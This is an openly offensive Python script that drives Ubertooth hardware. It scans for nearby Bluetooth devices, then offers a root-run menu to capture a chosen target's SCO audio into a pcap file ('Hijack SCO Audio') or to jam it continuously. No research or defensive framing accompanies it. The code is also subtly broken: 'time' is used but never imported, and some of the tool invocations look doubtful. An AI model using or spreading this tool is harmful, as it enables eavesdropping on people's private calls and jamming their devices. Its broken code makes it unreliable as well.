#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# UBERTOOTH TERMINATOR X v666 - FULL CONTROL EDITION

import os
import sys
import re
import signal
import subprocess
from datetime import datetime
import colorama
from colorama import Fore, Style

colorama.init()

class UberTerminator:
    def __init__(self):
        self.running = True
        self.targets = []
        self.attack_procs = []
        signal.signal(signal.SIGINT, self.kill_all)
        self.show_banner()

    def show_banner(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"""{Fore.MAGENTA}
   ___ _ _ _   ___ ___ _____ ___ ___ 
  | _ | | | |_| _ ) _|_   _|_ _/ _ \\
  | _ |_  _|_  _) _| | |  | | (_) |
  |___| |_| |_| |_|___| |_| |_|\___/
                                     
 ------------------------------------
    UBERTOOTH TERMINATOR X v666
   • Permanent Banner Display •
   • Full Process Control   •
   • Real Target Killing   •
 ------------------------------------
{Style.RESET_ALL}""")

    def kill_all(self, sig=None, frame=None):
        """Nuke all running attacks"""
        print(f"\n{Fore.RED}☠️ ACTIVATING TERMINATION PROTOCOL!{Style.RESET_ALL}")
        for proc in self.attack_procs:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except:
                pass
        os.system("pkill -9 -f 'ubertooth|hcidump|btmon'")
        sys.exit(0)

    def scan_devices(self):
        """Scan with Ubertooth only"""
        self.show_banner()
        print(f"{Fore.CYAN}🔍 Scanning for targets (15s)...{Style.RESET_ALL}")
        
        scan_proc = subprocess.Popen(["ubertooth-scan", "-t", "15"], 
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   preexec_fn=os.setsid)
        
        try:
            stdout, _ = scan_proc.communicate(timeout=20)
            self.targets = []
            for line in stdout.decode().split('\n'):
                if 'BD_ADDR' in line:
                    match = re.search(r'BD_ADDR: (([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})', line)
                    if match:
                        self.targets.append(match.group(1))
            return True
        except subprocess.TimeoutExpired:
            scan_proc.kill()
            return False

    def launch_attack(self, target, attack_type):
        """Execute attack with proper process control"""
        self.show_banner()
        print(f"{Fore.RED}⚔️ LAUNCHING ATTACK ON {target}{Style.RESET_ALL}")
        
        if attack_type == "sco":
            cmd = f"ubertooth-bt -S -t {target} -c sco_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
        elif attack_type == "jam":
            cmd = f"ubertooth-jam -b -t {target}"
        else:
            print(f"{Fore.RED}Invalid attack type!{Style.RESET_ALL}")
            return
        
        proc = subprocess.Popen(cmd, shell=True,
                              stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE,
                              preexec_fn=os.setsid)
        self.attack_procs.append(proc)
        return proc

    def main_loop(self):
        """Main interactive loop"""
        while self.running:
            self.show_banner()
            
            if not self.targets:
                if not self.scan_devices():
                    print(f"{Fore.RED}Scan failed!{Style.RESET_ALL}")
                    time.sleep(2)
                    continue
            
            print(f"\n{Fore.GREEN}=== LIVE TARGETS ==={Style.RESET_ALL}")
            for i, target in enumerate(self.targets, 1):
                print(f"{i}. {target}")
            
            print(f"\n{Fore.RED}=== KILL OPTIONS ==={Style.RESET_ALL}")
            print("1. Hijack SCO Audio")
            print("2. Continuous Jam")
            print("3. Rescan Targets")
            print("4. Nuke All Attacks")
            print("5. Exit")
            
            choice = input("\nSelect: ")
            
            if choice == "1" and self.targets:
                target_idx = int(input("Target number: ")) - 1
                self.launch_attack(self.targets[target_idx], "sco")
            elif choice == "2" and self.targets:
                target_idx = int(input("Target number: ")) - 1
                self.launch_attack(self.targets[target_idx], "jam")
            elif choice == "3":
                self.scan_devices()
            elif choice == "4":
                self.kill_all()
            elif choice == "5":
                self.running = False
            else:
                print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
                time.sleep(1)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{Fore.RED}Must be root! Run: sudo {sys.argv[0]}{Style.RESET_ALL}")
        sys.exit(1)
    
    terminator = UberTerminator()
    try:
        terminator.main_loop()
    except Exception as e:
        print(f"{Fore.RED}Critical error: {e}{Style.RESET_ALL}")
    finally:
        terminator.kill_all()
